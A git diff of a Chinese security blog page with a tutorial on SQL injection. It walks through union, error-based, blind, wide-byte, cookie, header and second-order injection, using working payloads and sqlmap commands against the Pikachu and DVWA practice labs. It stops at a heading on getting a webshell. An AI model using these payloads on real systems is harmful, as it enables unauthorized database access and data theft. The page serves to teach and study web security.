@@ -33,16 +33,16 @@ var CONFIG = {
 };
 
 window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-link"></i></span><span class="header-nav-menu-item__text">友链</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-info-circle"></i></span><span class="header-nav-menu-item__text">关于我</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Sculptor's blog</div><div class="header-banner-info__subtitle">不知名的陌生人</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">SQL注入</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2020-07-25</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2020-09-23</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
-        <h1 id="Web-入侵先遣——SQL注入攻击技术初探"   >
+        <h1 id="Web-入侵先遣——SQL注入攻击技术初探">
           <a href="#Web-入侵先遣——SQL注入攻击技术初探" class="heading-link"><i class="fas fa-link"></i></a>Web 入侵先遣——SQL注入攻击技术初探</h1>
       
-        <h2 id="前言"   >
+        <h2 id="前言">
           <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a>前言</h2>
       <p>SQL 注入式攻击技术，一般针对基本 Web 平台的应用程序，造成 SQL 注入 攻击漏洞的原因，是由于程序员在编写 Web 程序时，没有对浏览器端提交的参数进行严格的过滤和判断。用户可以修改构造参数，提交 SQL 查询语句，并传递至服务器端，从而获得想要的敏感信息，甚至执行危险的代码或系统命令。</p>
 <p>虽然 SQL 注入攻击技术早已出现，三十时至今日仍然有很大一部分网站存在 SQL 注入漏洞，在本章开篇中进行入侵检测中就就发现了各大门户网站同样存在 SQL 注入漏洞，更别说一些小网站了。由于 SQL 漏洞存在的普遍性，因此 SQL 入侵攻击技术往往成为黑客入侵攻击网站渗透内部服务的首选技术，危害性极大。</p>
 <a id="more"></a>
 
-        <h2 id="1-1-注射式攻击的原理"   >
+        <h2 id="1-1-注射式攻击的原理">
           <a href="#1-1-注射式攻击的原理" class="heading-link"><i class="fas fa-link"></i></a>1.1.注射式攻击的原理</h2>
       <p>注射式攻击的根源在于，程序命令和用户数据（即用户输入）之间没有做到泾渭分明。这使得攻击者有机会将程序命令当作用户输入的数据体提交给 Web 程序，以发号施令，为所欲为（注：注入最终是数据库，与脚本，平台无关）</p>
 <p>总之一句话：注入产生的原因是接受相关参数未经处理直接带入数据库查询操作。</p>
@@ -59,7 +59,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 </li>
 </ol>
 
-        <h2 id="1-2-经典-OR-漏洞原理解析"   >
+        <h2 id="1-2-经典-OR-漏洞原理解析">
           <a href="#1-2-经典-OR-漏洞原理解析" class="heading-link"><i class="fas fa-link"></i></a>1.2. 经典 OR 漏洞原理解析</h2>
       <p>大家经常听到网站万能密码登录，今天我们来分析分析万能密码是怎么回事。</p>
 <ol>
@@ -68,23 +68,23 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 </li>
 </ol>
 
-        <h2 id="1-3-注入前的准备及注入漏洞检测"   >
+        <h2 id="1-3-注入前的准备及注入漏洞检测">
           <a href="#1-3-注入前的准备及注入漏洞检测" class="heading-link"><i class="fas fa-link"></i></a>1.3. 注入前的准备及注入漏洞检测</h2>
       
-        <h3 id="1-3-1-取消友好-HTTP-错误信息"   >
+        <h3 id="1-3-1-取消友好-HTTP-错误信息">
           <a href="#1-3-1-取消友好-HTTP-错误信息" class="heading-link"><i class="fas fa-link"></i></a>1.3.1. 取消友好 HTTP 错误信息</h3>
       <p>在进行 SQL 注入攻击时，需要利用从服务器返回的各种出错信息，但是在浏览器中默认设置是不显示详细错误返回信息的，不论服务器返回什么错误，都只能看到“ HTTP 500 服务器错误 ” 的窗口。因此，每次进行 SQL 注入攻击测试时，首先要取消浏览器返回信息设置，以便查看到注入攻击时返回的数据库信息。</p>
 
-        <h3 id="1-3-2-手工检测-SQL-注入点"   >
+        <h3 id="1-3-2-手工检测-SQL-注入点">
           <a href="#1-3-2-手工检测-SQL-注入点" class="heading-link"><i class="fas fa-link"></i></a>1.3.2. 手工检测 SQL 注入点</h3>
       <p><strong>1. 最常用的 SQL 注入点判断方法，是在网站中寻找如下形式的网页链接</strong></p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.xxx.com/xxx.asp?id=xx%EF%BC%88ASP" >http://www.xxx.com/xxx.asp?id=xx（ASP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 注入）</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.xxx.com/xxx.php?id=xx%EF%BC%88PHP" >http://www.xxx.com/xxx.php?id=xx（PHP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 注入）</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.xxx.com/xxx.jsp?id=xx%EF%BC%88JSP" >http://www.xxx.com/xxx.jsp?id=xx（JSP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 注入）</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.xxx.com/xxx.aspx?id=xx%EF%BC%88ASPX%E6%B3%A8%E5%85%A5%EF%BC%89" >http://www.xxx.com/xxx.aspx?id=xx（ASPX注入）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.xxx.com/index.asp?id=xx&amp;page=xx%EF%BC%88%E6%B3%A8%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%9A%84%E6%97%B6%E5%80%99%E7%A1%AE%E8%AE%A4%E6%98%AF" >http://www.xxx.com/index.asp?id=xx&amp;page=xx（注：注入的时候确认是</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> id 参数还是 page 参数，工具默认只对后面 page 参数注入，所以要对工具进行配置或者手工调换</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.xxx.com/index/new/id/8%EF%BC%88%E4%BC%AA%E9%9D%99%E6%80%81%EF%BC%89" >http://www.xxx.com/index/new/id/8（伪静态）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.xxx.com/index/new/php-8.html%EF%BC%88%E4%BC%AA%E9%9D%99%E6%80%81%EF%BC%89" >http://www.xxx.com/index/new/php-8.html（伪静态）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://www.xxx.com/xxx.asp?id=xx%EF%BC%88ASP">http://www.xxx.com/xxx.asp?id=xx（ASP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 注入）</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://www.xxx.com/xxx.php?id=xx%EF%BC%88PHP">http://www.xxx.com/xxx.php?id=xx（PHP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 注入）</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://www.xxx.com/xxx.jsp?id=xx%EF%BC%88JSP">http://www.xxx.com/xxx.jsp?id=xx（JSP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 注入）</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://www.xxx.com/xxx.aspx?id=xx%EF%BC%88ASPX%E6%B3%A8%E5%85%A5%EF%BC%89">http://www.xxx.com/xxx.aspx?id=xx（ASPX注入）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://www.xxx.com/index.asp?id=xx&amp;page=xx%EF%BC%88%E6%B3%A8%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%9A%84%E6%97%B6%E5%80%99%E7%A1%AE%E8%AE%A4%E6%98%AF">http://www.xxx.com/index.asp?id=xx&amp;page=xx（注：注入的时候确认是</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> id 参数还是 page 参数，工具默认只对后面 page 参数注入，所以要对工具进行配置或者手工调换</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://www.xxx.com/index/new/id/8%EF%BC%88%E4%BC%AA%E9%9D%99%E6%80%81%EF%BC%89">http://www.xxx.com/index/new/id/8（伪静态）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://www.xxx.com/index/new/php-8.html%EF%BC%88%E4%BC%AA%E9%9D%99%E6%80%81%EF%BC%89">http://www.xxx.com/index/new/php-8.html（伪静态）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 <p>其中 id=xx 中的 “xx” 可能是数字，亦有可能是字符串，分别被称为整数典型数据和字符型数据。</p>
 <p><strong>2. 如何判断某个网页链接是否存在 SQL 注入漏洞通常有两种方法：</strong></p>
 <ol>
@@ -96,11 +96,11 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 </li>
 </ol>
 
-        <h2 id="1-4-注入分类"   >
+        <h2 id="1-4-注入分类">
           <a href="#1-4-注入分类" class="heading-link"><i class="fas fa-link"></i></a>1.4. 注入分类</h2>
       <p>配合靶机：192.168.133.133:81/pikachu/</p>
 
-        <h3 id="1-4-1-数字型注入"   >
+        <h3 id="1-4-1-数字型注入">
           <a href="#1-4-1-数字型注入" class="heading-link"><i class="fas fa-link"></i></a>1.4.1. 数字型注入</h3>
       <p>进入 mysql 命令行，</p>
 <ol>
@@ -233,7 +233,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 </li>
 </ol>
 
-        <h3 id="1-4-2-字符型注入"   >
+        <h3 id="1-4-2-字符型注入">
           <a href="#1-4-2-字符型注入" class="heading-link"><i class="fas fa-link"></i></a>1.4.2. 字符型注入</h3>
       <ol>
 <li><p>注入类型和数字型相似，就等于把原来的 id=字符串 or 1=1;</p>
@@ -244,7 +244,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 </li>
 </ol>
 
-        <h3 id="1-4-3-搜索型注入"   >
+        <h3 id="1-4-3-搜索型注入">
           <a href="#1-4-3-搜索型注入" class="heading-link"><i class="fas fa-link"></i></a>1.4.3. 搜索型注入</h3>
       <p>打开 pikachu 平台，在 SQL-inject 下选择搜索型注入，然后随意输入一个字母，能看到匹配出了对应的信息，按照 SQL 的模糊查询命令 select * from 表名 where 字段名 like ‘%(对应值)%’; ,发现可以按照之前的思路来实现万能语句的拼接。</p>
 <ol>
@@ -257,7 +257,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 </li>
 </ol>
 
-        <h3 id="1-4-4-xx-型注入"   >
+        <h3 id="1-4-4-xx-型注入">
           <a href="#1-4-4-xx-型注入" class="heading-link"><i class="fas fa-link"></i></a>1.4.4. xx 型注入</h3>
       <p>xx型是由于 SQL 语句拼接方式不同，注入语句如下：</p>
 <ol>
@@ -270,35 +270,35 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 </li>
 </ol>
 
-        <h2 id="1-5-提交方式"   >
+        <h2 id="1-5-提交方式">
           <a href="#1-5-提交方式" class="heading-link"><i class="fas fa-link"></i></a>1.5. 提交方式</h2>
       <p>ASP：request（全部接受），request.querystring（接受 get ），request.form（接受 post )，request.cookie cookie（接受 cookie ）</p>
 <p>PHP：<code>$_REQUEST</code>（全部接受），<code>$_GET</code>和<code>$_POST</code>（接受 post ），<code>$_cookie</code>（接受 cookie ）</p>
 <p>接受什么方式是由代码来决定的</p>
 
-        <h3 id="1-5-1-Get-提交"   >
+        <h3 id="1-5-1-Get-提交">
           <a href="#1-5-1-Get-提交" class="heading-link"><i class="fas fa-link"></i></a>1.5.1.  Get 提交</h3>
       <p>Burpsuite 中抓包的 get 方式就在 开头的get 里面修改</p>
 
-        <h3 id="1-5-2-Post-提交"   >
+        <h3 id="1-5-2-Post-提交">
           <a href="#1-5-2-Post-提交" class="heading-link"><i class="fas fa-link"></i></a>1.5.2. Post 提交</h3>
       <p>Burpsuite 中抓包的 post 都是在最后一行</p>
 <p>Hackbar 插件中用post 提交也可以</p>
 
-        <h3 id="1-5-3-Cookie-提交"   >
+        <h3 id="1-5-3-Cookie-提交">
           <a href="#1-5-3-Cookie-提交" class="heading-link"><i class="fas fa-link"></i></a>1.5.3. Cookie 提交</h3>
       <p>Burpsuite 中抓包的 cookie 就是在 cookie 一栏中修改</p>
 
-        <h2 id="1-6-注入攻击方式"   >
+        <h2 id="1-6-注入攻击方式">
           <a href="#1-6-注入攻击方式" class="heading-link"><i class="fas fa-link"></i></a>1.6. 注入攻击方式</h2>
       <p>主要有 union 注入，insert / update 注入，delete 注入，http header 注入，盲注(base boolion)，盲注(base on time)，函数报错，宽字节注入，二次注入，偏移注入等。</p>
 
-        <h3 id="1-6-1-union-注入"   >
+        <h3 id="1-6-1-union-注入">
           <a href="#1-6-1-union-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.1. union 注入</h3>
       <p>union 操作符用于合并两个或者多个 SQL 语句集合起来，得到联合的查询结果，</p>
 <ol>
 <li><p>SQL 命令：</p>
-<p>mysql&gt; select id,username from member where username=’kevin’ union select email,<br>pw from member where id=1;<br>+——————-+———————————-+<br>| id                | username                         |<br>+——————-+———————————-+<br>| 5                 | kevin                            |<br>| <span class="exturl"><a class="exturl__link"   href="mailto:&#118;&#x69;&#x6e;&#x63;&#x65;&#x40;&#112;&#x69;&#x6b;&#x61;&#99;&#x68;&#x75;&#46;&#99;&#111;&#x6d;" >&#118;&#x69;&#x6e;&#x63;&#x65;&#x40;&#112;&#x69;&#x6b;&#x61;&#99;&#x68;&#x75;&#46;&#99;&#111;&#x6d;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> | e10adc3949ba59abbe56e057f20f883e |<br>+——————-+———————————-+<br>2 rows in set (0.00 sec)</p>
+<p>mysql&gt; select id,username from member where username=’kevin’ union select email,<br>pw from member where id=1;<br>+——————-+———————————-+<br>| id                | username                         |<br>+——————-+———————————-+<br>| 5                 | kevin                            |<br>| <span class="exturl"><a class="exturl__link" href="mailto:&#118;&#x69;&#110;&#x63;&#101;&#x40;&#x70;&#105;&#x6b;&#x61;&#x63;&#104;&#117;&#46;&#x63;&#111;&#x6d;">&#118;&#x69;&#110;&#x63;&#101;&#x40;&#x70;&#105;&#x6b;&#x61;&#x63;&#104;&#117;&#46;&#x63;&#111;&#x6d;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> | e10adc3949ba59abbe56e057f20f883e |<br>+——————-+———————————-+<br>2 rows in set (0.00 sec)</p>
 </li>
 <li><p>pikachu 平台</p>
 <p>搜索型注入：v’ union select username,pw from member where id=1#%</p>
@@ -314,7 +314,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 </li>
 </ol>
 
-        <h3 id="1-6-2-information-schema-注入"   >
+        <h3 id="1-6-2-information-schema-注入">
           <a href="#1-6-2-information-schema-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.2. information_schema 注入</h3>
       <p>information_schema 数据库是 MySQL 系统自带的数据库，其中报存着关于 MySQL 服务器所维护的所有其他数据库的信息，通过 information——schema 注入，我们可以将整个数据库内容全部窃取出来，使用 order by 来判断查询的字段，先找出数据库的名称，输入 vince’ union select database(),user(),3#% ，得到反馈：判断数据库名称为 pikachu;</p>
 <p>获取所有数据库的库名：输入：u’ union select 1,2,group_concat(schema_name) from information_schema.schemata#</p>
@@ -322,13 +322,13 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 <p>获取 member 数据表的字段名，输入：v’ union select table_name,column_name,3 from information_schema.columns where table_name=’member’#</p>
 <p><strong>注意：</strong></p>
 
-        <h4 id="1-6-2-1-group-concat-函数"   >
+        <h4 id="1-6-2-1-group-concat-函数">
           <a href="#1-6-2-1-group-concat-函数" class="heading-link"><i class="fas fa-link"></i></a>1.6.2.1 group_concat()函数</h4>
       <p>利用 group_concat()函数可以得到所有库名，或者同一库名下的所有表名，省去了一个个的麻烦</p>
 <p>函数里面加 schema_name,table_name,column_name 就可以了</p>
 <p>同时，利用 union select group_concat(字段名) from (库名.表名) 可以得到字段内容 </p>
 
-        <h3 id="1-6-3-基于函数报错注入"   >
+        <h3 id="1-6-3-基于函数报错注入">
           <a href="#1-6-3-基于函数报错注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.3. 基于函数报错注入</h3>
       <ol>
 <li><p>技巧思路</p>
@@ -376,7 +376,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 </li>
 </ol>
 
-        <h3 id="1-6-4-insert-注入"   >
+        <h3 id="1-6-4-insert-注入">
           <a href="#1-6-4-insert-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.4. insert 注入</h3>
       <p>insert 注入，就是前端注册的信息最终通过 insert 这个操作插入数据库，后台在接受前端的注册数据时没有做防 SQL 注入的处理，导致前端的输入可以直接 SQL 到后端的 insert 相关的内容中，导致了 insert 注入。</p>
 <ol>
@@ -408,7 +408,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 </li>
 </ol>
 
-        <h3 id="1-6-5-update-注入"   >
+        <h3 id="1-6-5-update-注入">
           <a href="#1-6-5-update-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.5. update 注入</h3>
       <p>与 insert 注入方法大体相同，区别在于 update 用于用户登录端，insert 用于用户注册端。</p>
 <p>一般登录网站前台或后台更新用户信息的地方，填写用户需要修改的相关信息，通过 Burp 抓包在用户名输入相关的 payload，格式如下：</p>
@@ -420,24 +420,24 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 <p><strong>注意：</strong></p>
 <p>有的时候，后端人员会设置过滤，所以我们在注入时可以换成 url 编码，（选中 payload 然后 ctrl+u ，就可以看到把空格换成了+号）</p>
 
-        <h3 id="1-6-6-delete-注入"   >
+        <h3 id="1-6-6-delete-注入">
           <a href="#1-6-6-delete-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.6. delete 注入</h3>
       <p>一般应用于前后端发帖，留言，用户等相关删除操作，点击删除按钮可通过 Burp 抓包，对数据包相关 delete 参数进行注入，</p>
 <p>注入方法如下：delete from message where id=56 or updatexml(2,concat(0x7e,(select database())),0)</p>
 <p><strong>Hackbar 操作：</strong></p>
-<p>输入留言版信息，提交后，复制 “删除” 的链接，在 Hackbar 中 URL 中输入：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://192.168.133.133:81/pikachu/vul/sqli/sqli_del.php?id=58" >http://192.168.133.133:81/pikachu/vul/sqli/sqli_del.php?id=58</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> or updatexml(2,concat(0x7e,(database())),0)</p>
+<p>输入留言版信息，提交后，复制 “删除” 的链接，在 Hackbar 中 URL 中输入：<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://192.168.133.133:81/pikachu/vul/sqli/sqli_del.php?id=58">http://192.168.133.133:81/pikachu/vul/sqli/sqli_del.php?id=58</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> or updatexml(2,concat(0x7e,(database())),0)</p>
 <p>点击 Execute 获得：XPATH syntax error: ‘~pikachu’</p>
 
-        <h3 id="1-6-7-Http-Header-注入"   >
+        <h3 id="1-6-7-Http-Header-注入">
           <a href="#1-6-7-Http-Header-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.7. Http Header 注入</h3>
       <p>先在 pikachu 平台打开 http header 注入模块，点击查看登录账号和密码，登录后去 Burp 中找到登录地 GET 请求，把请求发送到 Repeater 模块中，去除 User-Agent:，然后输入 ‘，然后运行观察 MySQL 语法报错然后发现存在 SQL 注入漏洞，这时候可以设置 payload 。在 User-Agent 输入 payload Mozilla’ or updatexml(1,concat(0x7e,database()),0) or’</p>
 <p>(注意：在 Repeater 模块中数据可以发送到 Intruter 模块中，然后在positions中对单一的参数进行 And$，再在 payload中对参数导入可能的库值，进行暴力破解)</p>
 
-        <h3 id="1-6-8-Cookie-注入"   >
+        <h3 id="1-6-8-Cookie-注入">
           <a href="#1-6-8-Cookie-注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.8. Cookie 注入</h3>
       <p>Cookie 是网站为了识别用户身份来跟踪会话的，虽然 Cookie 是由后端生成的，但每次页面跳转，后端都对前端的 Cookie 的信息进行验证，但如果后端获取 Cookie 后放在数据库中进行拼接，那么这也将是一个 SQL 注入点。在 ant[uname]=admin 后添加一个 ‘  来观察反馈的 MySQL 的语法报错，发现了存在 SQL 漏洞，在设置 Payload ‘ and updatexml(1,concat(0x7e,database()),0)#，观察报错和之前是否相同。</p>
 
-        <h3 id="1-6-9-Boolian（布尔型）盲注"   >
+        <h3 id="1-6-9-Boolian（布尔型）盲注">
           <a href="#1-6-9-Boolian（布尔型）盲注" class="heading-link"><i class="fas fa-link"></i></a>1.6.9. Boolian（布尔型）盲注</h3>
       <p>在我们注入语句被带入数据库查询单却社么都没有返回的情况下我们该怎么办？例如应用程序就会返回一个”通用的” 的页面，或者重定向一个通用页面（可能为网站首页），这时，我们之前学习的 SQL 注入办法就无法使用了。</p>
 <p>盲注：即在 SQL 注入过程中，SQL 语句执行选择后不能回显到前端，我们需要使用一些特殊的方法进行判断或尝试，这个过程称为盲注。</p>
@@ -463,13 +463,13 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 </li>
 </ol>
 
-        <h3 id="1-6-10-Base-on-time-时间型-盲注"   >
+        <h3 id="1-6-10-Base-on-time-时间型-盲注">
           <a href="#1-6-10-Base-on-time-时间型-盲注" class="heading-link"><i class="fas fa-link"></i></a>1.6.10. Base on time(时间型)盲注</h3>
       <p>到 base on time 盲注下，输入上个演示中设置好的 payload：vince’ and ascii(substr(database(),1,1))=112#    ，返回的信息发现不存在注入点，那这样就不能进行注入了？但其实可以通过后端的执行时间来进行注入。这里会用到 payload：vince’ and sleep(x)#</p>
 <p>基于时间的延迟，构造一个拼接语句：vince’ and if(substr(database(),1,1)=’x’,sleep(10),null)#    其中’x’ 中的 x 为猜测字符，如果猜测正确，那么就会响应10秒；如果错误，就会立刻返回错误；这样我们就可以逐级向下获取数据。（弊端：这个很麻烦，得一个个逐级向下判断）</p>
 <p>它的拼接语句和 布尔型的有点类似，我决定也差不多就是多了个 if 的判断条件，从而利用 sleep 来判断是否正确。</p>
 
-        <h3 id="1-6-11-宽字节注入"   >
+        <h3 id="1-6-11-宽字节注入">
           <a href="#1-6-11-宽字节注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.11. 宽字节注入</h3>
       <p>下列使用了URL 编码转换</p>
 <p>当我们把 php.ini 文件里面的 magic_quotes_gpc 参数设为 ON 时，所有  ‘（单引号），”（双引号），\（反斜杠）和 null 字符都会被自动加上一个反斜杠进行转义。还有很多函数有类似的作用，如：addslashes()，mysql_escape_string()，mysql_real_escape_string()等。另外还有 parse_str() 后的变量也受 magic_quotes_gpc 的影响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤变量，这看上去很安全，很多漏洞查找者或者工具遇到这些函数过滤后的变量直接放弃，但是就在他们放弃的同时也放弃了很多致命的漏洞。</p>
@@ -489,7 +489,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 <p>**总结： **</p>
 <p>但我们输入 id=值后，显示的 SQL语句发现自动加上了 \ ，就可以通过 %df 来使得其成为繁体字 <strong>運</strong> 。</p>
 
-        <h3 id="1-6-12-堆叠注入"   >
+        <h3 id="1-6-12-堆叠注入">
           <a href="#1-6-12-堆叠注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.12. 堆叠注入</h3>
       <p>堆叠注入为攻击者提供了很多控制权，与仅限于SELECT语句的UNION联合查询攻击不同，<strong>堆叠注入可以用于执行任何SQL语句。</strong></p>
 <p><strong>堆叠注入原理</strong></p>
@@ -501,7 +501,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 <p><strong>堆叠注入的局限性</strong></p>
 <p>堆叠注入并不是在每种情况下都能使用的。大多数时候，因为API或数据库引擎的不支持，堆叠注入都无法实现。</p>
 
-        <h2 id="2-1-二阶-SQL-注入"   >
+        <h2 id="2-1-二阶-SQL-注入">
           <a href="#2-1-二阶-SQL-注入" class="heading-link"><i class="fas fa-link"></i></a>2.1. 二阶 SQL 注入</h2>
       <p>一种特别的有意避开过滤的方法与二阶 SQL 注入(second-order SQL injection) 有关。当数据首次插入数据库中时，许多应用程序能够安全处理这些数据。但是，一但数据存储在数据库中，随后应用程序本身或其他后端进程可能会以危险的方式处理这些数据。许多这类应用程序并不像面向因特网的主要应用程序一样安全，却拥有较高权限的数据库账户。</p>
 <ol>
@@ -528,13 +528,13 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 </ol>
 <p>攻击者已经成功避开旨在阻止 SQL注入攻击的输入确认，现在他能够在数据库中执行任意查询并获得查询结果。</p>
 
-        <h2 id="2-2-Cookie-注入"   >
+        <h2 id="2-2-Cookie-注入">
           <a href="#2-2-Cookie-注入" class="heading-link"><i class="fas fa-link"></i></a>2.2. Cookie 注入</h2>
       <p>大家都知道注入分为：GET，POST，COOKIE注入，当一个站增加了防注入程序后，很多朋友都会放弃，其实可以试试 COOKIE注入，下面实例就是对 GET 和 POST 做了防注入，但忘了 COOKIE 注入。在演示前先了解一下 ASP 和 PHP 数据提交方式。</p>
 <p>ASP：request（全部接受），request.querystring（接受 get ），request.form（接受 post )，request.cookie cookie（接受 cookie ）</p>
 <p>PHP：<code>$_REQUEST</code>（全部接受），<code>$_GET</code>和<code>$_POST</code>（接受 post ），<code>$_cookie</code>（接受 cookie ）</p>
 
-        <h3 id="2-2-1-实例"   >
+        <h3 id="2-2-1-实例">
           <a href="#2-2-1-实例" class="heading-link"><i class="fas fa-link"></i></a>2.2.1. 实例</h3>
       <p><strong>方法一：</strong></p>
 <p>用 Burp 进行拦截</p>
@@ -559,11 +559,11 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
 <p><strong>post注入：</strong>进入 Sqlmap 的物理路径进行 cmd ，&gt;sqlmap.py -u “注入站点.asp” –data “id=参数值”</p>
 <p><strong>cookie注入：</strong>进入 Sqlmap 的物理路径进行 cmd ，&gt;sqlmap.py -u “注入站点.asp” –cookie “id=参数值” –level 2   （默认 level 是1，当 cookie 注入时要&gt;=2，最高是5）</p>
 
-        <h2 id="3-1-MySQL-实战-Webshell"   >
+        <h2 id="3-1-MySQL-实战-Webshell">
           <a href="#3-1-MySQL-实战-Webshell" class="heading-link"><i class="fas fa-link"></i></a>3.1. MySQL 实战 Webshell</h2>
       <p>以下操作使用到 DVWA</p>
 
-        <h3 id="3-1-1-使用-order-by-查询字段"   >
+        <h3 id="3-1-1-使用-order-by-查询字段">
           <a href="#3-1-1-使用-order-by-查询字段" class="heading-link"><i class="fas fa-link"></i></a>3.1.1. 使用 order by 查询字段</h3>
